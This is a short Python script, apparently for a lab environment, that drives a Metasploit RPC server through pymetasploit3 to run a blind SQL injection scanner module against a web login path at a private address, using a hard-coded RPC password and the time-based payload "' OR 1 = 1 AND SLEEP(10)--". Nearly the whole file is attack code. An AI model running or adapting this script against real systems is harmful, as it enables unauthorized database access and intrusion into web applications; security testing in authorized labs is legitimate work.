from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', server='172.26.0.6', port=55553)

def run_blind_sql_injection(target, port, path, sql):
    module = client.modules.use('auxiliary', 'scanner/http/blind_sql_query')

    module['RHOSTS'] = target
    module['RPORT'] = port
    module['PATH'] = path
    module['QUERY'] = sql

    result = module.execute()
    print(result)


run_blind_sql_injection('172.30.0.4', 3000, '/#/login', "' OR 1 = 1 AND SLEEP(10)--")
    